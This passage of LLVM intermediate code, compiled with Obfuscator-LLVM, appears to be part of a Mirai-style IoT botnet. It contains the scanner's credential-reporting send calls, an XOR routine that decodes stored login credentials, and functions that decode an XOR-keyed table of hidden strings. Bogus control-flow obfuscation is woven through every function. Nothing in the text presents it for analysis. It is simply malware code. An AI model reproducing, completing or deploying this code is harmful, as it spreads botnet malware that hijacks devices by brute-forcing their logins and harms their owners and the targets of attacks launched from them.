  %182 = call i64 @send(i32 %179, i8* %181, i64 1, i32 16384)
  %183 = load i32, i32* %9, align 4
  %184 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %185 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %184, i32 0, i32 1
  %186 = load i8*, i8** %185, align 8
  %187 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %188 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %187, i32 0, i32 5
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i64
  %191 = call i64 @send(i32 %183, i8* %186, i64 %190, i32 16384)
  %192 = load i32, i32* %9, align 4
  %193 = call i32 @close(i32 %192)
  call void @exit(i32 0) #8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 %13) #6
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* %15, i8* %16, i32 %19)
  store i32 0, i32* %5, align 4
  br label %20

; <label>:20:                                     ; preds = %originalBBpart210, %2
  %21 = load i32, i32* @x.79
  %22 = load i32, i32* @y.80
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %20
  %29 = load i32, i32* %5, align 4
  %30 = load i32*, i32** %4, align 8
  %31 = load i32, i32* %30, align 4
  %32 = icmp slt i32 %29, %31
  %33 = load i32, i32* @x.79
  %34 = load i32, i32* @y.80
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %93

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 222
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 222
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  %58 = load i8*, i8** %6, align 8
  %59 = load i32, i32* %5, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = xor i32 %63, 251
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %61, align 1
  %66 = load i8*, i8** %6, align 8
  %67 = load i32, i32* %5, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = xor i32 %71, 175
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %69, align 1
  br label %74

; <label>:74:                                     ; preds = %41
  %75 = load i32, i32* @x.79
  %76 = load i32, i32* @y.80
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = load i32, i32* %5, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %5, align 4
  %85 = load i32, i32* @x.79
  %86 = load i32, i32* @y.80
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br label %20

; <label>:93:                                     ; preds = %originalBBpart2
  %94 = load i8*, i8** %6, align 8
  ret i8* %94

originalBBalteredBB:                              ; preds = %originalBB, %20
  %95 = load i32, i32* %5, align 4
  %96 = load i32*, i32** %4, align 8
  %97 = load i32, i32* %96, align 4
  %98 = icmp slt i32 %95, %97
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %74
  %99 = load i32, i32* %5, align 4
  %_ = shl i32 %99, 1
  %_2 = sub i32 %99, 1
  %gen = mul i32 %_2, 1
  %_3 = sub i32 %99, 1
  %gen4 = mul i32 %_3, 1
  %_5 = sub i32 %99, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %99, 1
  %gen8 = mul i32 %_7, 1
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = load i32, i32* @x.83
  %3 = load i32, i32* @y.84
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.table_value*, align 8
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  store i8 %0, i8* %10, align 1
  %17 = load i8, i8* %10, align 1
  %18 = zext i8 %17 to i64
  %19 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %18
  store %struct.table_value* %19, %struct.table_value** %12, align 8
  %20 = load i32, i32* @table_key, align 4
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %13, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 8
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %14, align 1
  %27 = load i32, i32* @table_key, align 4
  %28 = lshr i32 %27, 16
  %29 = and i32 %28, 255
  %30 = trunc i32 %29 to i8
  store i8 %30, i8* %15, align 1
  %31 = load i32, i32* @table_key, align 4
  %32 = lshr i32 %31, 24
  %33 = and i32 %32, 255
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %16, align 1
  store i32 0, i32* %11, align 4
  %35 = load i32, i32* @x.83
  %36 = load i32, i32* @y.84
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %43

; <label>:43:                                     ; preds = %115, %originalBBpart2
  %44 = load i32, i32* %11, align 4
  %45 = load %struct.table_value*, %struct.table_value** %12, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %118

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* @x.83
  %52 = load i32, i32* @y.84
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %50
  %59 = load i8, i8* %13, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %12, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %11, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %14, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %12, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  %83 = load i8, i8* %15, align 1
  %84 = zext i8 %83 to i32
  %85 = load %struct.table_value*, %struct.table_value** %12, align 8
  %86 = getelementptr inbounds %struct.table_value, %struct.table_value* %85, i32 0, i32 0
  %87 = load i8*, i8** %86, align 8
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = xor i32 %92, %84
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %90, align 1
  %95 = load i8, i8* %16, align 1
  %96 = zext i8 %95 to i32
  %97 = load %struct.table_value*, %struct.table_value** %12, align 8
  %98 = getelementptr inbounds %struct.table_value, %struct.table_value* %97, i32 0, i32 0
  %99 = load i8*, i8** %98, align 8
  %100 = load i32, i32* %11, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = xor i32 %104, %96
  %106 = trunc i32 %105 to i8
  store i8 %106, i8* %102, align 1
  %107 = load i32, i32* @x.83
  %108 = load i32, i32* @y.84
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart265, label %originalBB41alteredBB

originalBBpart265:                                ; preds = %originalBB41
  br label %115

; <label>:115:                                    ; preds = %originalBBpart265
  %116 = load i32, i32* %11, align 4
  %117 = add nsw i32 %116, 1
  store i32 %117, i32* %11, align 4
  br label %43

; <label>:118:                                    ; preds = %43
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %119 = alloca i8, align 1
  %120 = alloca i32, align 4
  %121 = alloca %struct.table_value*, align 8
  %122 = alloca i8, align 1
  %123 = alloca i8, align 1
  %124 = alloca i8, align 1
  %125 = alloca i8, align 1
  store i8 %0, i8* %119, align 1
  %126 = load i8, i8* %119, align 1
  %127 = zext i8 %126 to i64
  %128 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %127
  store %struct.table_value* %128, %struct.table_value** %121, align 8
  %129 = load i32, i32* @table_key, align 4
  %_ = shl i32 %129, 255
  %_1 = shl i32 %129, 255
  %130 = and i32 %129, 255
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %122, align 1
  %132 = load i32, i32* @table_key, align 4
  %_2 = sub i32 %132, 8
  %gen = mul i32 %_2, 8
  %_3 = sub i32 0, %132
  %gen4 = add i32 %_3, 8
  %_5 = shl i32 %132, 8
  %_6 = shl i32 %132, 8
  %_7 = sub i32 %132, 8
  %gen8 = mul i32 %_7, 8
  %133 = lshr i32 %132, 8
  %_9 = sub i32 0, %133
  %gen10 = add i32 %_9, 255
  %_11 = shl i32 %133, 255
  %_12 = sub i32 0, %133
  %gen13 = add i32 %_12, 255
  %_14 = shl i32 %133, 255
  %_15 = sub i32 %133, 255
  %gen16 = mul i32 %_15, 255
  %_17 = sub i32 %133, 255
  %gen18 = mul i32 %_17, 255
  %134 = and i32 %133, 255
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %123, align 1
  %136 = load i32, i32* @table_key, align 4
  %_19 = shl i32 %136, 16
  %_20 = shl i32 %136, 16
  %_21 = sub i32 %136, 16
  %gen22 = mul i32 %_21, 16
  %_23 = sub i32 %136, 16
  %gen24 = mul i32 %_23, 16
  %_25 = sub i32 0, %136
  %gen26 = add i32 %_25, 16
  %_27 = sub i32 %136, 16
  %gen28 = mul i32 %_27, 16
  %137 = lshr i32 %136, 16
  %_29 = sub i32 0, %137
  %gen30 = add i32 %_29, 255
  %138 = and i32 %137, 255
  %139 = trunc i32 %138 to i8
  store i8 %139, i8* %124, align 1
  %140 = load i32, i32* @table_key, align 4
  %_31 = shl i32 %140, 24
  %_32 = shl i32 %140, 24
  %_33 = shl i32 %140, 24
  %_34 = shl i32 %140, 24
  %_35 = shl i32 %140, 24
  %_36 = sub i32 0, %140
  %gen37 = add i32 %_36, 24
  %_38 = shl i32 %140, 24
  %_39 = shl i32 %140, 24
  %_40 = shl i32 %140, 24
  %141 = lshr i32 %140, 24
  %142 = and i32 %141, 255
  %143 = trunc i32 %142 to i8
  store i8 %143, i8* %125, align 1
  store i32 0, i32* %120, align 4
  br label %originalBB

originalBB41alteredBB:                            ; preds = %originalBB41, %50
  %144 = load i8, i8* %13, align 1
  %145 = zext i8 %144 to i32
  %146 = load %struct.table_value*, %struct.table_value** %12, align 8
  %147 = getelementptr inbounds %struct.table_value, %struct.table_value* %146, i32 0, i32 0
  %148 = load i8*, i8** %147, align 8
  %149 = load i32, i32* %11, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds i8, i8* %148, i64 %150
  %152 = load i8, i8* %151, align 1
  %153 = sext i8 %152 to i32
  %_42 = sub i32 %153, %145
  %gen43 = mul i32 %_42, %145
  %_44 = sub i32 %153, %145
  %gen45 = mul i32 %_44, %145
  %_46 = shl i32 %153, %145
  %_47 = shl i32 %153, %145
  %_48 = sub i32 0, %153
  %gen49 = add i32 %_48, %145
  %_50 = shl i32 %153, %145
  %_51 = shl i32 %153, %145
  %154 = xor i32 %153, %145
  %155 = trunc i32 %154 to i8
  store i8 %155, i8* %151, align 1
  %156 = load i8, i8* %14, align 1
  %157 = zext i8 %156 to i32
  %158 = load %struct.table_value*, %struct.table_value** %12, align 8
  %159 = getelementptr inbounds %struct.table_value, %struct.table_value* %158, i32 0, i32 0
  %160 = load i8*, i8** %159, align 8
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %_52 = shl i32 %165, %157
  %_53 = shl i32 %165, %157
  %_54 = sub i32 0, %165
  %gen55 = add i32 %_54, %157
  %166 = xor i32 %165, %157
  %167 = trunc i32 %166 to i8
  store i8 %167, i8* %163, align 1
  %168 = load i8, i8* %15, align 1
  %169 = zext i8 %168 to i32
  %170 = load %struct.table_value*, %struct.table_value** %12, align 8
  %171 = getelementptr inbounds %struct.table_value, %struct.table_value* %170, i32 0, i32 0
  %172 = load i8*, i8** %171, align 8
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds i8, i8* %172, i64 %174
  %176 = load i8, i8* %175, align 1
  %177 = sext i8 %176 to i32
  %_56 = sub i32 0, %177
  %gen57 = add i32 %_56, %169
  %178 = xor i32 %177, %169
  %179 = trunc i32 %178 to i8
  store i8 %179, i8* %175, align 1
  %180 = load i8, i8* %16, align 1
  %181 = zext i8 %180 to i32
  %182 = load %struct.table_value*, %struct.table_value** %12, align 8
  %183 = getelementptr inbounds %struct.table_value, %struct.table_value* %182, i32 0, i32 0
  %184 = load i8*, i8** %183, align 8
  %185 = load i32, i32* %11, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds i8, i8* %184, i64 %186
  %188 = load i8, i8* %187, align 1
  %189 = sext i8 %188 to i32
  %_58 = sub i32 %189, %181
  %gen59 = mul i32 %_58, %181
  %_60 = sub i32 %189, %181
  %gen61 = mul i32 %_60, %181
  %_62 = sub i32 %189, %181
  %gen63 = mul i32 %_62, %181
  %190 = xor i32 %189, %181
  %191 = trunc i32 %190 to i8
  store i8 %191, i8* %187, align 1
  br label %originalBB41
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %66

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %originalBBpart2, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %65

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %66

; <label>:43:                                     ; preds = %35
  br label %45

; <label>:44:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* @x.89
  %48 = load i32, i32* @y.90
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %46
  %55 = load i32, i32* %10, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %10, align 4
  %57 = load i32, i32* @x.89
  %58 = load i32, i32* @y.90
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %17

; <label>:65:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %40, %15
  %67 = load i32, i32* %5, align 4
  ret i32 %67

originalBBalteredBB:                              ; preds = %originalBB, %46
  %68 = load i32, i32* %10, align 4
  %_ = sub i32 %68, 1
  %gen = mul i32 %_, 1
  %_1 = shl i32 %68, 1
  %_2 = shl i32 %68, 1
  %_3 = sub i32 0, %68
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 0, %68
  %gen6 = add i32 %_5, 1
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %10, align 4
  br label %originalBB
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146817152}
!2 = !{i32 -2146816743}
